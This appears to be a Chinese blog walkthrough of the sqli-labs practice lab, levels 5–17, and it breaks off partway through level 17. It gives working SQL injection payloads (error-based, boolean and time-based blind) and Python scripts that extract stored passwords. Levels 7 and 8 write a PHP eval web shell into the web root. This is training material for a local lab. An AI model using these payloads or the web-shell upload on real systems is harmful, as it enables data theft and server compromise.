<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>爆出列名【id，username，password】，可以在中间加个@，使得结果id@1更清楚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),&#39;@&#39;,floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>爆出字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select password from security.users limit 0,1),&#39;@&#39;,floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>而对于这种麻烦的工作我们可以写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-5'</span></span><br><span class="line">column = [<span class="string">'username'</span>,<span class="string">'password'</span>]</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	print(<span class="string">"No."</span> +str(i)+ <span class="string">":"</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">		payload = <span class="string">"?id=-1' union select 1,count(*),concat((select "</span> +column[j]+ <span class="string">" from security.users limit "</span> + str(i) + <span class="string">",1),'@',floor(rand(0)*2))x from information_schema.schemata group by x  --+"</span></span><br><span class="line">		r = requests.get(url+payload)</span><br><span class="line">		con = r.text</span><br><span class="line">		start = con.find(<span class="string">'Duplicate entry'</span>)</span><br><span class="line">		end = con.find(<span class="string">'for key'</span>)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> start==<span class="number">-1</span>:</span><br><span class="line">			flag=<span class="number">0</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			print(con[start+<span class="number">17</span>:end<span class="number">-4</span>])</span><br></pre></td></tr></table></figure>





<h3 id="updatexml-XML-document-XPath-string-new-value-报错注入"><a href="#updatexml-XML-document-XPath-string-new-value-报错注入" class="headerlink" title="updatexml(XML_document, XPath_string, new_value)报错注入"></a>updatexml(XML_document, XPath_string, new_value)报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select(database())),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/5_7.png" alt="5_7"></p>
<p>updatexml也是限制了32位的字符输出，我们还是利用limit n,1慢慢爆出表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p>假如该题还限制了空格的输入，那么我们还可以这样：(括号代替空格，like代替=)【limit 0,1不太知道怎么替换】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;security&#39;)limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="截取部分回显结果以无视长度限制"><a href="#截取部分回显结果以无视长度限制" class="headerlink" title="截取部分回显结果以无视长度限制"></a>截取部分回显结果以无视长度限制</h4><p>如果说一个字段的长度就已经超过了updatexml最大的32字符了怎么办呢，我们可以使用left(str,n)/right(str,n)来读取，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;^updatexml(1,concat(0x7e,(select(right(table_name,30))from(information_schema.tables)where(table_schema)like(&#39;security&#39;)limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/5_8.png" alt="5_8"></p>
<p>后面发现用substring也是可以的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;xxx&#39;) and extractvalue(1,concat(0x7e,(select group_concat(substring(password,1,1)) from security.users),0x7e))#&amp;passwd&#x3D;admin</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/5_9.png" alt="5_9"></p>
<h3 id="extractvalue-目标xml文档，xml路径"><a href="#extractvalue-目标xml文档，xml路径" class="headerlink" title="extractvalue(目标xml文档，xml路径)"></a>extractvalue(目标xml文档，xml路径)</h3><p>大体上和updatexml相似，只是少一个参数而已，类似于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and extractvalue(1,concat(0x7e,(select(database())),0x7e))--+</span><br></pre></td></tr></table></figure>







<h2 id="No-6"><a href="#No-6" class="headerlink" title="No.6"></a>No.6</h2><p>和第五关一样，只是把<code>?id=-1&#39;</code> 改成了<code>?id=-1&quot;</code></p>
<h2 id="No-7【输出到外部】"><a href="#No-7【输出到外部】" class="headerlink" title="No.7【输出到外部】"></a>No.7【输出到外部】</h2><p>还是先测试注入点</p>
<p>?id=1正常</p>
<p>?id=1 and 1=2也正常，说明不是数字型注入</p>
<p>?id=1’发现报错</p>
<p>?id=1”发现不报错</p>
<p>那么接下来就以单引号为基础来找注入点</p>
<blockquote>
<p>为什么接下来就以单引号为基础来找注入点？</p>
<p>以这道题为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>单引号围起来的地方，里面id数值之后所有除了单引号的符号都会被忽略，所有双引号后加东西是没有意义的。</p>
</blockquote>
<p>?id=1’)) –+发现正常回显，于是推测原语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/7_1.png" alt="7_1"></p>
<p>想到可能要将回显结果输出到一个外部文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,database(),3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\test.txt&quot;--+</span><br><span class="line">&#x2F;* 一定记住要用\\而不是\，应该是要转义的原因 *&#x2F;</span><br></pre></td></tr></table></figure>

<p>这样查看test.txt就可以看到</p>
<p><img src="/2020/09/26/sql-labs/7_2.png" alt="7_2"></p>
<p>可是正常情况下，我们不可能进到人家文件夹里看东西，如果那样的话，sql注入也没有意义了，于是我们想到写入一句话木马：【一句话外面的双引号不能少，单引号还真不行，因为包裹id就用的单引号，可能会产生一些错误】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>

<p>接着就可以连接蚁剑了</p>
<p><img src="/2020/09/26/sql-labs/7_3.png" alt="7_3"></p>
<h2 id="No-8"><a href="#No-8" class="headerlink" title="No.8"></a>No.8</h2><p>首先测试注入点，发现是单引号注入，然后尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\Sql-labs\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure>

<p>直接成功，但是这题也可以用布尔型注入和时间型注入。</p>
<h2 id="No-9【时间型注入】"><a href="#No-9【时间型注入】" class="headerlink" title="No.9【时间型注入】"></a>No.9【时间型注入】</h2><p>这一关找注入点比较恼火，测试了单引号，双引号，括号等等的东西，都只返回一个“You are in…..”</p>
<p>甚至<code>?id=1&#39; and 1=2 --+</code>这种类似于布尔型注入，都返回“You are in…..”</p>
<p>于是这题就只能使用时间型注入了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if((ascii(substring((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit i,1),j,1))&gt;k),1,sleep(2)) --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解释下这个payload：</p>
<p>选到了第i个字段以后，截取其中第j个字母【substring】，判断这个字母的ascii码是否大于k，如果大于k则正常返回页面，如果小于k则两秒后返回页面。</p>
</blockquote>
<p>然后这样未免有些太麻烦了，于是就写了个脚本【这里爆库和爆表和爆字段长度都不长，不需要limit，最后爆具体内容要用到】</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-9'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(0,10):</span></span><br><span class="line">	<span class="comment">#print("table" +str(i)+":")</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		payload = <span class="string">"?id=1' and if((ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),"</span> +str(j)+ <span class="string">",1))&gt;"</span> +str(k)+ <span class="string">"),1,sleep(2)) --+"</span></span><br><span class="line">		time1 = time.time()</span><br><span class="line">		r = requests.get(url + payload)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		use = time2 - time1</span><br><span class="line">		<span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">			<span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">				flag=<span class="number">0</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += chr(k)</span><br><span class="line">				print(res)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">					</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>







<h2 id="No-10"><a href="#No-10" class="headerlink" title="No.10"></a>No.10</h2><p>这一关和第九关一样，就是注入点从?id=1’变成了?id=1”</p>
<p>这块就补上No.9里差的最后一步要用limit的注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-10'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	print(<span class="string">"password"</span> +str(i)+<span class="string">":"</span>)</span><br><span class="line">	flag = <span class="number">1</span></span><br><span class="line">	res = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">			payload = <span class="string">'?id=1" and if((ascii(substring((select password from security.users limit '</span> +str(i)+ <span class="string">',1),'</span> +str(j)+ <span class="string">',1))&gt;'</span> +str(k)+ <span class="string">'),1,sleep(2)) --+'</span></span><br><span class="line">			time1 = time.time()</span><br><span class="line">			r = requests.get(url + payload)</span><br><span class="line">			time2 = time.time()</span><br><span class="line">			use = time2 - time1</span><br><span class="line">			<span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">				<span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">					flag=<span class="number">0</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					res += chr(k)</span><br><span class="line">					print(res)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">					</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>





<h2 id="No-11【登录框注入】"><a href="#No-11【登录框注入】" class="headerlink" title="No.11【登录框注入】"></a>No.11【登录框注入】</h2><p>这关开始就进入了带有登录框的sql注入了。</p>
<p>一般这种输入框的后端请求数据库的格式都类似这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>于是我们可以这样构造：</p>
<p><img src="/2020/09/26/sql-labs/11_1.png" alt="11_1"></p>
<p>就相当于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;#</span><br></pre></td></tr></table></figure>

<p>接下来其实就和前十关爆的核心方法差距不大了</p>
<p>爆列数：【2正常，得知是2列】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; order by 3#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/11_2.png" alt="11_2"></p>
<p>爆库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select 1,database()#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/11_3.png" alt="11_3"></p>
<p>爆表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/11_4.png" alt="11_4"></p>
<p>爆列：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/11_5.png" alt="11_5"></p>
<p>爆具体字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;xxx&#39; union select group_concat(username),group_concat(password) from security.users#&amp;passwd&#x3D;123</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/11_6.png" alt="11_6"></p>
<h3 id="有趣发现1"><a href="#有趣发现1" class="headerlink" title="有趣发现1"></a>有趣发现1</h3><blockquote>
<p><img src="/2020/09/26/sql-labs/11_7.png" alt="11_7"></p>
<p>在group_concat函数里面用right()，每一个字段的长度都会被截取到3</p>
</blockquote>
<h2 id="No-12"><a href="#No-12" class="headerlink" title="No.12"></a>No.12</h2><p>这一关和No.11区别不大，只是注入点变成了<code>uname=admin&quot;)#&amp;passwd=123</code></p>
<h3 id="有趣的发现2"><a href="#有趣的发现2" class="headerlink" title="有趣的发现2"></a>有趣的发现2</h3><blockquote>
<p>还有就是总结一下，后端请求sql语句用了什么哪种引号，只有注入时测试带这种引号的注入点才能成功，比如这题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname&#x3D;&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;</span><br><span class="line">$passwd&#x3D;&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;($uname) and password&#x3D;($passwd) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>因为原式语句里带了双引号，你只有测试<code>?id=1&quot;</code>或者?id=1”)这类带双引号的语句才会报错【双引号不匹配】，输入类似<code>?id=1&#39;</code>的语句不会报错【’在“”包裹下只会被当成普通的字符，相当于请求一个username为admin’的用户，不会成功】</p>
</blockquote>
<h2 id="No-13"><a href="#No-13" class="headerlink" title="No.13"></a>No.13</h2><p>先测试注入点，发现注入点是<code>?uname=admin&#39;)#</code></p>
<p>然后就开始像前两关一样注入，可是发现没有任何回显，那么就想到用No.5的报错型注入，就像：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;xxx&#39;) union select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.schemata group by x #&amp;passwd&#x3D;admin</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;xxx&#39;) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1)#&amp;passwd&#x3D;admin</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;xxx&#39;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e))#&amp;passwd&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>就可以注入成功</p>
<h2 id="No-14"><a href="#No-14" class="headerlink" title="No.14"></a>No.14</h2><p>也没啥，就是注入点变成了<code>?uname=xxx&quot;</code></p>
<h2 id="No-15"><a href="#No-15" class="headerlink" title="No.15"></a>No.15</h2><p>测试了一下这关不回显也不报错，只能用时间注入或者布尔注入</p>
<p>布尔注入测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#x2F;*测试符号*&#x2F; and 1&#x3D;1 #&amp;passwd&#x3D;xxx			&#x2F;&#x2F;成功</span><br><span class="line">uname&#x3D;admin&#x2F;*测试符号*&#x2F; and 1&#x3D;2 #&amp;passwd&#x3D;xxx			&#x2F;&#x2F;失败</span><br></pre></td></tr></table></figure>

<p>布尔注入测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#x2F;*测试符号*&#x2F; and sleep(2) #&amp;passwd&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>最后测得注入点是单引号。</p>
<p>于是可以构造布尔注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&gt;100#&amp;passwd&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>当然也可以构造时间注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and if((ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&gt;101),1,sleep(2))#&amp;passwd&#x3D;xxx</span><br></pre></td></tr></table></figure>



<h3 id="遗留疑惑1"><a href="#遗留疑惑1" class="headerlink" title="遗留疑惑1"></a>遗留疑惑1</h3><ol>
<li><p>布尔注入时，写脚本时候，requests.text返回成功页面和失败页面没有区别。</p>
</li>
<li><p>现在发现，好像是post数据通过python脚本传不过去。。。很迷，自己测试的本地post都成功</p>
</li>
<li><p>我简直要吐了。调试了那么多东西，改了将近一天时间，你们知道错误出在哪吗？？？！！！错误出在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-15&#39;</span><br><span class="line">这玩意我少加了&#x2F;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-15&#x2F;&#39;</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>所以布尔注入的脚本就是这样：[不行了气死我了]</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## by Albatross</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-15/'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	print(<span class="string">"password"</span> +str(i)+<span class="string">":"</span>)</span><br><span class="line">	flag = <span class="number">1</span></span><br><span class="line">	res = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">			uname = <span class="string">"admin' and if((ascii(substring((select password from security.users limit "</span> +str(i)+ <span class="string">",1),"</span> +str(j)+ <span class="string">",1))&gt;"</span> +str(k)+ <span class="string">"),1,sleep(2))#"</span></span><br><span class="line">			passwd = <span class="string">"xxx"</span></span><br><span class="line">			data1 = &#123;<span class="string">"uname"</span>:uname,<span class="string">"passwd"</span>:passwd,<span class="string">"submit"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">			time1 = time.time()</span><br><span class="line">			r = requests.post(url,data=data1)</span><br><span class="line">			time2 = time.time()</span><br><span class="line">			use = time2 - time1</span><br><span class="line">			<span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">				<span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">					flag=<span class="number">0</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					res += chr(k)</span><br><span class="line">					print(res)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">					</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>







<h2 id="No-16"><a href="#No-16" class="headerlink" title="No.16"></a>No.16</h2><p>和上一关区别不大，只是注入点变成了<code>?uname=admin&quot;)</code></p>
<h2 id="No-17【UPDATE修改密码】"><a href="#No-17【UPDATE修改密码】" class="headerlink" title="No.17【UPDATE修改密码】"></a>No.17【UPDATE修改密码】</h2><p>这一关就比较不一样了，这是一个修改密码的页面，而且发现无论对uname做什么操作，都会得到：</p>
<p><img src="/2020/09/26/sql-labs/17_1.png" alt="17_1"></p>
<p>查看源代码发现uname数据要经过下面这个函数的过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($con, $value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysqli_real_escape_string($con, $value) . <span 